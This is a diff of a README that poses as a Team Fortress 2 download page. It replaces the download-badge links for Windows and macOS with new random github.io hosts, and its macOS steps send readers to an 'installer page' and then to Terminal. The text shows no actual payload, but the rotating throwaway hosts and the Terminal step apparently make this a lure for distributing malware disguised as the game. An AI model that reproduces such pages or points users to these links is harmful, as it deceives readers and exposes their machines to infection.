@@ -26,7 +26,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Team%20Fortress%202-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
+[![Download](https://img.shields.io/badge/⬇_Download_Team%20Fortress%202-F9A825?style=for-the-badge&logo=github)](https://nrotnjxfyuta.github.io/win-setup/)
 
 </div>
 
@@ -65,9 +65,9 @@ Nine distinct classes provide a broad range of tactical abilities and personalit
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://etgysfcihddy.github.io/windows-dl/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://nrotnjxfyuta.github.io/win-setup/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etgysfcihddy.github.io/macos-dl/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://nrotnjxfyuta.github.io/mac-setup/)
 
 </div>
 
@@ -108,7 +108,7 @@ Nine distinct classes provide a broad range of tactical abilities and personalit
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etgysfcihddy.github.io/macos-dl/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://nrotnjxfyuta.github.io/mac-setup/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
